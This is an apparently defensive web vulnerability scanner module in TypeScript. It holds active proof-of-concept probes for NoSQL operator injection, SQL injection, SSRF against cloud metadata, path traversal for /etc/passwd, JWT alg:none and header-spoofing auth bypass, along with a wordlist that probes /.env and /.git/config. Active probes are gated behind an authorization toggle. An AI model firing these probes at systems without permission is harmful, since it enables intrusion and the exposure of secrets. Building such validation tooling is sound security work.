async function pocNoSqlInjection(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const u = new URL(target);
  const params = Array.from(u.searchParams.keys());
  if (params.length === 0) {
    return { verdict: "inconclusive", summary: "URL has no query parameters to fuzz.", poc: "Inject Mongo operator payloads into query params and diff responses.", steps: [] };
  }
  const steps: ProbeStep[] = [];
  const findings: string[] = [];
  const baseline = await probeStep("Baseline", "GET", target);
  steps.push(baseline);
  for (const p of params.slice(0, 3)) {
    const t = new URL(u); t.searchParams.delete(p); t.searchParams.set(`${p}[$ne]`, "nsl-poc-canary");
    const s = await probeStep(`NoSQL ?${p}[$ne]=…`, "GET", t.toString());
    steps.push(s);
    if (s.status && s.status >= 200 && s.status < 300 && s.bodyBytes > baseline.bodyBytes + 256) {
      findings.push(`${p}[$ne] returned ${s.status} with ${s.bodyBytes}B (baseline ${baseline.bodyBytes}B) — operator interpreted server-side.`);
    }
  }
  return {
    verdict: findings.length > 0 ? "confirmed" : "not-exploitable",
    summary: findings.length > 0 ? `NoSQL operator injection indicators:\n${findings.join("\n")}` : "No parameter reacted to Mongo-style operator payloads.",
    poc: "Replace ?p=v with ?p[$ne]=canary; if the response grows substantially, the operator is honored server-side.",
    steps,
  };
}

// ---------- dispatcher ----------

export const POC_LIBRARY = [
  { id: "open-redirect", label: "Open redirect", active: false, desc: "Test 9 common redirect query params against an external canary." },
  { id: "mixed-content", label: "Mixed content", active: false, desc: "Find http:// subresources loaded from an https:// page." },
  { id: "sri", label: "Subresource Integrity", active: false, desc: "Flag cross-origin <script> tags missing an integrity= attribute." },
  { id: "cors", label: "CORS reflection", active: false, desc: "Send hostile Origin; check for reflection + credentials." },
  { id: "cache-poison", label: "Cache-key host injection", active: false, desc: "Inject X-Forwarded-Host and look for reflection." },
  { id: "hsts", label: "HTTPS downgrade / HSTS", active: false, desc: "Force http:// and check redirect + HSTS on the plain response." },
  { id: "xss-reflect", label: "Reflected XSS canary", active: false, desc: "Inject a benign canary via ?q= and locate the reflection context." },
  { id: "headers", label: "Security header audit", active: false, desc: "Snapshot response headers and flag missing hardening headers." },
  { id: "redirect-chain", label: "Redirect chain", active: false, desc: "Follow up to 5 hops; flag off-origin or protocol downgrade." },
  { id: "verb-tampering", label: "HTTP verb tampering", active: true, desc: "PUT / DELETE / PATCH / TRACE against the same URL." },
  { id: "anon-access", label: "Auth bypass: anonymous access", active: false, desc: "Check whether a supposedly protected URL returns data to a caller with no cookies or Authorization header." },
  { id: "forwarded-user", label: "Auth bypass: X-Forwarded-User trust", active: false, desc: "Compare anonymous vs spoofed X-Forwarded-User / X-Remote-User headers." },
  { id: "original-url", label: "Auth bypass: X-Original-URL rewrite", active: false, desc: "Fetch '/' with X-Original-URL pointing at the protected path; look for ACL bypass." },
  { id: "jwt-alg-none", label: "Auth bypass: JWT alg:none", active: false, desc: "Send an unsigned JWT (alg:\"none\") asserting admin claims and compare to anonymous baseline." },
  { id: "sql-injection", label: "SQL injection (error + boolean)", active: true, desc: "Inject '\" into each query param, then a boolean TRUE/FALSE pair; diff responses." },
  { id: "ssrf", label: "SSRF via fetch params", active: true, desc: "Point url/src/target-shaped params at cloud metadata endpoints and loopback." },
  { id: "path-traversal", label: "Path traversal", active: true, desc: "Encoded ../ payloads against file/path/include params; grep for /etc/passwd markers." },
  { id: "graphql-introspection", label: "GraphQL introspection", active: false, desc: "POST __schema query to /graphql and common variants; flag if schema returned." },
  { id: "idor", label: "IDOR numeric enumeration", active: true, desc: "Sweep ±N around a numeric ID in the path or query; flag distinct 2xx bodies." },
  { id: "nosql-injection", label: "NoSQL operator injection", active: true, desc: "Replace ?p=v with ?p[$ne]=canary; look for response growth vs baseline." },
] as const;

export type PocId = typeof POC_LIBRARY[number]["id"];

async function pocHeadersAudit(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const s1 = await probeStep("Snapshot response headers", "GET", target);
  const wanted = [
    "strict-transport-security",
    "content-security-policy",
    "x-frame-options",
    "x-content-type-options",
    "referrer-policy",
    "permissions-policy",
    "cross-origin-opener-policy",
    "cross-origin-resource-policy",
  ];
  const missing = wanted.filter((h) => !s1.responseHeaders[h]);
  return {
    verdict: missing.length > 0 ? "confirmed" : "not-exploitable",
    summary: missing.length > 0
      ? `Missing hardening headers: ${missing.join(", ")}`
      : "All standard hardening headers present.",
    poc: "GET the URL and diff response headers against the browser-hardening baseline.",
    steps: [s1],
  };
}

const StandaloneInput = z.object({
  url: z.string().url().refine((u) => u.startsWith("https://") || u.startsWith("http://"), "url must be http(s)"),
  pocId: z.string().min(1).max(60),
  authorizeActive: z.boolean().optional().default(false),
});

export const runStandalonePoc = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data: z.infer<typeof StandaloneInput>) => StandaloneInput.parse(data))
  .handler(async ({ data }): Promise<ValidationResult> => {
    const ranAt = new Date().toISOString();
    const entry = POC_LIBRARY.find((p) => p.id === data.pocId);
    const wrap = (
      active: boolean,
      body: Omit<ValidationResult, "findingId" | "ranAt" | "active">,
    ): ValidationResult => ({ findingId: `poc:${data.pocId}`, ranAt, active, ...body });

    if (!entry) return wrap(false, { verdict: "error", summary: `Unknown PoC id "${data.pocId}"`, poc: "", steps: [] });
    if (entry.active && !data.authorizeActive) {
      return wrap(true, {
        verdict: "skipped",
        summary: "Active PoC blocked. Toggle authorization to run.",
        poc: entry.desc,
        steps: [],
      });
    }

    try {
      switch (data.pocId as PocId) {
        case "open-redirect": return wrap(false, await pocOpenRedirect(data.url));
        case "mixed-content": return wrap(false, await pocMixedContent(data.url));
        case "sri":           return wrap(false, await pocSri(data.url));
        case "cors":          return wrap(false, await pocCors(data.url));
        case "cache-poison":  return wrap(false, await pocCachePoison(data.url));
        case "hsts":          return wrap(false, await pocHsts(data.url));
        case "xss-reflect":   return wrap(false, await pocXss(data.url));
        case "headers":       return wrap(false, await pocHeadersAudit(data.url));
        case "redirect-chain":return wrap(false, await pocRedirect(data.url));
        case "verb-tampering":return wrap(true,  await pocVerbTampering(data.url));
        case "anon-access":   return wrap(false, await pocAnonAccess(data.url));
        case "forwarded-user":return wrap(false, await pocForwardedUser(data.url));
        case "original-url":  return wrap(false, await pocOriginalUrl(data.url));
        case "jwt-alg-none":  return wrap(false, await pocJwtAlgNone(data.url));
        case "sql-injection": return wrap(true,  await pocSqlInjection(data.url));
        case "ssrf":          return wrap(true,  await pocSsrf(data.url));
        case "path-traversal":return wrap(true,  await pocPathTraversal(data.url));
        case "graphql-introspection": return wrap(false, await pocGraphqlIntrospection(data.url));
        case "idor":          return wrap(true,  await pocIdorEnumeration(data.url));
        case "nosql-injection":return wrap(true, await pocNoSqlInjection(data.url));
        default:              return wrap(false, { verdict: "error", summary: `Unhandled PoC id`, poc: "", steps: [] });
      }
    } catch (e) {
      return wrap(entry.active, { verdict: "error", summary: e instanceof Error ? e.message : String(e), poc: entry.desc, steps: [] });
    }
  });

// ---------- restricted-path discovery ----------

export interface DiscoveredLink {
  url: string;
  path: string;
  source: "crawl" | "wordlist";
  keyword: string;
  status: number | null;
  bodyBytes: number;
  looksRestricted: boolean;
  reason: string;
}

const RESTRICTED_KEYWORDS = [
  "admin", "administrator", "manager", "management", "console", "dashboard",
  "backend", "portal", "internal", "staff", "moderator", "root", "sysadmin",
  "control", "controlpanel", "cpanel", "wp-admin", "settings", "config",
  "users", "accounts", "billing", "invoice", "reports", "audit", "logs",
  "api/admin", "api/internal", "api/v1/admin", "api/v1/users",
];

const COMMON_PATHS = [
  "/admin", "/admin/", "/administrator", "/manager", "/management",
  "/dashboard", "/console", "/backend", "/portal", "/internal", "/staff",
  "/wp-admin", "/wp-login.php", "/cpanel", "/phpmyadmin", "/pma",
  "/control", "/controlpanel", "/settings", "/config", "/configuration",
  "/users", "/accounts", "/billing", "/reports", "/audit", "/logs",
  "/api/admin", "/api/internal", "/api/v1/admin", "/api/v1/users",
  "/api/v1/accounts", "/graphql", "/actuator", "/actuator/env",
  "/.env", "/.git/config",
];

function classifyRestricted(status: number | null, bodyBytes: number): { restricted: boolean; reason: string } {
  if (status === 401 || status === 403) return { restricted: true, reason: `HTTP ${status} — auth required` };
  if (status === 302 || status === 301 || status === 307 || status === 308) return { restricted: true, reason: `HTTP ${status} — redirect (likely to login)` };
  if (status && status >= 200 && status < 300 && bodyBytes > 0) return { restricted: false, reason: `HTTP ${status} — publicly reachable (${bodyBytes}B)` };
  if (status === 404) return { restricted: false, reason: "HTTP 404 — not found" };
  return { restricted: false, reason: `HTTP ${status ?? "no response"}` };
}

const DiscoverInput = z.object({
  targetUrl: z.string().url(),
  includeWordlist: z.boolean().optional().default(true),
  maxLinks: z.number().int().min(1).max(60).optional().default(40),
});

export const discoverRestrictedLinks = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data: z.infer<typeof DiscoverInput>) => DiscoverInput.parse(data))
  .handler(async ({ data }): Promise<{ links: DiscoveredLink[]; crawledFrom: string; crawlStatus: number | null }> => {
    const origin = new URL(data.targetUrl).origin;
    const found = new Map<string, DiscoveredLink>();

    // 1. Crawl the target page for hrefs whose text or path contains a restricted keyword
    const s1 = await probeStep("Crawl target for restricted-looking links", "GET", data.targetUrl);
    const body = s1.bodySnippet;
    const anchorRe = /<a\b[^>]*\bhref\s*=\s*["']([^"']+)["'][^>]*>([\s\S]*?)<\/a>/gi;
    let m: RegExpExecArray | null;
    while ((m = anchorRe.exec(body)) !== null) {
      const href = m[1];
      const label = m[2].replace(/<[^>]+>/g, "").trim().toLowerCase();
      if (!href || href.startsWith("#") || href.startsWith("mailto:") || href.startsWith("javascript:")) continue;
      let abs: string;
      try { abs = new URL(href, data.targetUrl).toString(); } catch { continue; }
      if (new URL(abs).origin !== origin) continue;
      const p = new URL(abs).pathname.toLowerCase();
      const kw = RESTRICTED_KEYWORDS.find((k) => p.includes(k) || label.includes(k));
      if (!kw) continue;
      if (!found.has(abs)) {
        found.set(abs, {
          url: abs, path: new URL(abs).pathname,
          source: "crawl", keyword: kw,
          status: null, bodyBytes: 0, looksRestricted: false, reason: "pending",
        });
      }
      if (found.size >= data.maxLinks) break;
    }

    // 2. Wordlist expansion
    if (data.includeWordlist) {
      for (const p of COMMON_PATHS) {
        if (found.size >= data.maxLinks) break;
        const abs = new URL(p, origin).toString();
        if (!found.has(abs)) {
          const kw = RESTRICTED_KEYWORDS.find((k) => p.toLowerCase().includes(k)) ?? p.replace(/^\//, "");
          found.set(abs, {
            url: abs, path: p, source: "wordlist", keyword: kw,
            status: null, bodyBytes: 0, looksRestricted: false, reason: "pending",
          });
        }
      }
    }

    // 3. HEAD-probe each candidate in parallel batches to classify
    const links = Array.from(found.values());
    const CONC = 6;
    for (let i = 0; i < links.length; i += CONC) {
      const slice = links.slice(i, i + CONC);
      await Promise.all(slice.map(async (l) => {
        const step = await probeStep(`Probe ${l.path}`, "GET", l.url, {}, 6000);
        l.status = step.status;
        l.bodyBytes = step.bodyBytes;
        const cls = classifyRestricted(step.status, step.bodyBytes);
        l.looksRestricted = cls.restricted;
        l.reason = cls.reason;
      }));
    }

    return { links, crawledFrom: data.targetUrl, crawlStatus: s1.status };
  });

// ---------- dispatcher ----------

export const runValidation = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data: z.infer<typeof InputSchema>) => InputSchema.parse(data))
  .handler(async ({ data }): Promise<ValidationResult> => {
    const id = data.findingId;
    const ranAt = new Date().toISOString();

    const wrap = (
      active: boolean,
      body: Omit<ValidationResult, "findingId" | "ranAt" | "active">,
    ): ValidationResult => ({ findingId: id, ranAt, active, ...body });

    try {
      // ---- HSTS ----
      if (id === "hdr-Strict-Transport-Security") {
        return wrap(false, await pocHsts(data.targetUrl));
      }
      // ---- headers ----
      if (id.startsWith("hdr-")) {
        const name = id.slice(4);
        return wrap(false, await pocHeader(data.targetUrl, name));
      }
      // ---- cookies ----
      if (id.startsWith("cookie-")) {
        const name = id.slice(7);
        return wrap(false, await pocCookie(data.targetUrl, name));
      }
      // ---- TLS posture ----
      if (id === "tls-posture") {
        return wrap(false, await pocHsts(data.targetUrl));
      }
      // ---- XSS ----
      if (id.startsWith("xss-")) {
        return wrap(false, await pocXss(data.targetUrl));
      }
      // ---- Recon exposure / redirect ----
      if (id.startsWith("recon-")) {
        if (id.includes("redirect") || id.startsWith("recon-redirect")) {
          return wrap(false, await pocRedirect(data.targetUrl));
        }
        return wrap(false, await pocExposure(data.targetUrl, data.path));
      }
      // ---- CSRF (ACTIVE) ----
      if (id.startsWith("csrf-")) {
        if (!data.authorizeActive) {
          return wrap(true, {
            verdict: "skipped",
            summary: "Active PoC blocked. Toggle 'I authorize active exploitation on this target I own' to run.",
            poc: "Cross-origin POST from an untrusted origin.",
            steps: [],
          });
        }
        const endpoint = data.path ?? id.slice(5);
        return wrap(true, await pocCsrfActive(data.targetUrl, endpoint));
      }
      // ---- Session (needs reauth probe) ----
      if (id.startsWith("session-")) {
        return wrap(false, {
          verdict: "inconclusive",
          summary: "Session-handling findings require credentials. Run the Reauth Probe module to validate.",
          poc: "See /reauth for authenticated session validation.",
          steps: [],
        });
      }

      return wrap(false, {
        verdict: "inconclusive",
        summary: `No automated PoC available for finding id "${id}".`,
        poc: "Manual verification required.",
        steps: [],
      });
    } catch (e) {
      return wrap(false, {
        verdict: "error",
        summary: e instanceof Error ? e.message : String(e),
        poc: "",
        steps: [],
      });
    }
  });
